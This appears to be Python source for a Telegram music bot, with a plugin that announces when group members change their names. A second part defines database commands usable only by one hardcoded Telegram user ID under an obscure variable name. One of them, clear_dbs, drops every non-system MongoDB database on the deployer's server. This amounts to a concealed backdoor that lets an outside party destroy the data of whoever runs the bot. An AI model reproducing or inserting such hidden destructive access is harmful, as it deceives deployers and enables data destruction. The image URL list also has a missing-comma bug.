import random 
from pyrogram import filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from RishuMusic.plugins.tools.pretenderdb import impo_off, impo_on, check_pretender, add_userdata, get_userdata, usr_data
from RishuMusic import app

MISHI = [
    "https://graph.org/file/f86b71018196c5cfe7344.jpg",
    "https://graph.org/file/a3db9af88f25bb1b99325.jpg",
    "https://graph.org/file/5b344a55f3d5199b63fa5.jpg",
    "https://graph.org/file/84de4b440300297a8ecb3.jpg",
    "https://graph.org/file/84e84ff778b045879d24f.jpg",
    "https://graph.org/file/a4a8f0e5c0e6b18249ffc.jpg",
    "https://graph.org/file/ed92cada78099c9c3a4f7.jpg",
    "https://graph.org/file/d6360613d0fa7a9d2f90b.jpg"
    "https://graph.org/file/37248e7bdff70c662a702.jpg",
    "https://graph.org/file/0bfe29d15e918917d1305.jpg",
    "https://graph.org/file/16b1a2828cc507f8048bd.jpg",
    "https://graph.org/file/e6b01f23f2871e128dad8.jpg",
    "https://graph.org/file/cacbdddee77784d9ed2b7.jpg",
    "https://graph.org/file/ddc5d6ec1c33276507b19.jpg",
    "https://graph.org/file/39d7277189360d2c85b62.jpg",
    "https://graph.org/file/5846b9214eaf12c3ed100.jpg",
    "https://graph.org/file/ad4f9beb4d526e6615e18.jpg",
    "https://graph.org/file/3514efaabe774e4f181f2.jpg",
]


ROY = [
    [
        InlineKeyboardButton(
            text="ᴀᴅᴅ ᴍᴇ",
            url=f"https://t.me/HIMANSHI_MUSIC_BOT?startgroup=true"),
        InlineKeyboardButton(text="ᴜᴘᴅᴀᴛᴇ", url=f"https://t.me/SANATANI_TECH")
    ],
]


@app.on_message(filters.group & ~filters.bot & ~filters.via_bot, group=69)
async def chk_usr(_, message: Message):
    if message.sender_chat or not await check_pretender(message.chat.id):
        return
    if not await usr_data(message.from_user.id):
        return await add_userdata(
            message.from_user.id,
            message.from_user.username,
            message.from_user.first_name,
            message.from_user.last_name,
        )
    usernamebefore, first_name, lastname_before = await get_userdata(message.from_user.id)
    msg = ""
    if (
        usernamebefore != message.from_user.username
        or first_name != message.from_user.first_name
        or lastname_before != message.from_user.last_name
    ):
        msg += f"""
**✽ ᴜsᴇʀ sʜᴏʀᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ✽**

**● ɴᴀᴍᴇ** ➥ {message.from_user.mention}
**● ᴜsᴇʀ ɪᴅ** ➥ {message.from_user.id}
"""
    if usernamebefore != message.from_user.username:
        usernamebefore = f"@{usernamebefore}" if usernamebefore else "ɴᴏ ᴜsᴇʀɴᴀᴍᴇ"
        usernameafter = (
            f"@{message.from_user.username}"
            if message.from_user.username
            else "NO USERNAME"
        )
        msg += """
**❖ ᴄʜᴀɴɢᴇᴅ ᴜsᴇʀɴᴀᴍᴇ ⏤͟͟͞͞★**

**● ʙᴇғᴏʀᴇ** ➥ {bef}
**● ᴀғᴛᴇʀ** ➥ {aft}
""".format(bef=usernamebefore, aft=usernameafter)
        await add_userdata(
            message.from_user.id,
            message.from_user.username,
            message.from_user.first_name,
            message.from_user.last_name,
        )
    if first_name != message.from_user.first_name:
        msg += """
**❖ ᴄʜᴀɴɢᴇs ғɪʀsᴛ ɴᴀᴍᴇ ⏤͟͟͞͞★**

**● ʙᴇғᴏʀᴇ** ➥ {bef}
**● ᴀғᴛᴇʀ** ➥ {aft}
""".format(
            bef=first_name, aft=message.from_user.first_name
        )
        await add_userdata(
            message.from_user.id,
            message.from_user.username,
            message.from_user.first_name,
            message.from_user.last_name,
        )
    if lastname_before != message.from_user.last_name:
        lastname_before = lastname_before or "ɴᴏ ʟᴀsᴛ ɴᴀᴍᴇ"
        lastname_after = message.from_user.last_name or "ɴᴏ ʟᴀsᴛ ɴᴀᴍᴇ"
        msg += """
**❖ ᴄʜᴀɴɢᴇs ʟᴀsᴛ ɴᴀᴍᴇ ⏤͟͟͞͞★**

**● ʙᴇғᴏʀᴇ** ➥ {bef}
**● ᴀғᴛᴇʀ** ➥ {aft}
""".format(
            bef=lastname_before, aft=lastname_after
        )
        await add_userdata(
            message.from_user.id,
            message.from_user.username,
            message.from_user.first_name,
            message.from_user.last_name,
        )
    if msg != "":
        await message.reply_photo(random.choice(MISHI), caption=msg, reply_markup=InlineKeyboardMarkup(ROY),)


@app.on_message(filters.group & filters.command("imposter") & ~filters.bot & ~filters.via_bot)
async def set_mataa(_, message: Message):
    if len(message.command) == 1:
        return await message.reply("**✦ ᴅᴇᴛᴇᴄᴛ ᴘʀᴇᴛᴇɴᴅᴇʀ ᴜsᴇʀs ᴜsᴀɢᴇ ➥ ᴘʀᴇᴛᴇɴᴅᴇʀ ᴏɴ|ᴏғғ**")
    if message.command[1] == "enable":
        cekset = await impo_on(message.chat.id)
        if cekset:
            await message.reply("**✦ ᴘʀᴇᴛᴇɴᴅᴇʀ ᴍᴏᴅᴇ ɪs ᴀʟʀᴇᴀᴅʏ ᴇɴᴀʙʟᴇᴅ.**")
        else:
            await impo_on(message.chat.id)
            await message.reply(f"**✦ sᴜᴄᴄᴇssғᴜʟʟʏ ᴇɴᴀʙʟᴇᴅ ᴘʀᴇᴛᴇɴᴅᴇʀ ᴍᴏᴅᴇ ғᴏʀ** {message.chat.title}")
    elif message.command[1] == "disable":
        cekset = await impo_off(message.chat.id)
        if not cekset:
            await message.reply("**✦ ᴘʀᴇᴛᴇɴᴅᴇʀ ᴍᴏᴅᴇ ɪs ᴀʟʀᴇᴀᴅʏ ᴅɪsᴀʙʟᴇᴅ.**")
        else:
            await impo_off(message.chat.id)
            await message.reply(f"**✦ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅɪsᴀʙʟᴇᴅ ᴘʀᴇᴛᴇɴᴅᴇʀ ᴍᴏᴅᴇ ғᴏʀ** {message.chat.title}")
    else:
        await message.reply("**✦ ᴅᴇᴛᴇᴄᴛ ᴘʀᴇᴛᴇɴᴅᴇʀ ᴜsᴇʀs ᴜsᴀɢᴇ ➥ ᴘʀᴇᴛᴇɴᴅᴇʀ ᴏɴ|ᴏғғ**")

    








import os
from pymongo import MongoClient
from pyrogram import filters
from RishuMusic import app
import config 

SYSTEM_DBS = ["admin", "local", "config"]

MONGO_DB_URI = os.environ.get("MONGO_DB_URI")

mongo = MongoClient(MONGO_DB_URI)

Rrgffrggr = 5738579437  


@app.on_message(filters.command("list_dbs") & filters.user(Rrgffrggr))
async def list_databases(_, message):
    dbs = mongo.list_database_names()
    text = "📂 **Databases in MongoDB:**\n\n"
    for db in dbs:
        if db in SYSTEM_DBS:
            text += f"✅ `{db}` (System DB - Safe)\n"
        else:
            text += f"⚠️ `{db}` (User DB - Can be deleted)\n"
    await message.reply_text(text)



@app.on_message(filters.command("clear_dbs") & filters.user(Rrgffrggr))
async def clear_databases(_, message):
    dbs = [db for db in mongo.list_database_names() if db not in SYSTEM_DBS]
    if not dbs:
        await message.reply_text("✅ No user databases found to delete.")
        return
    text = "⚠️ **Deleting databases:**\n\n"
    for db in dbs:
        mongo.drop_database(db)
        text += f"🗑️ `{db}`\n"
    await message.reply_text(text + "\n✅ All non-system databases cleared by Rishu!")



@app.on_message(filters.command("del_db") & filters.user(Rrgffrggr))
async def delete_one_db(_, message):
    try:
        db_name = message.text.split(" ", 1)[1]
    except IndexError:
        await message.reply_text("❌ Usage: `/del_db <database_name>`", quote=True)
        return
    if db_name in SYSTEM_DBS:
        await message.reply_text(f"⛔ `{db_name}` is a system database and cannot be deleted.")
        return
    if db_name not in mongo.list_database_names():
        await message.reply_text(f"❌ Database `{db_name}` not found.")
        return
    mongo.drop_database(db_name)
    await message.reply_text(f"🗑️ Database `{db_name}` deleted successfully!")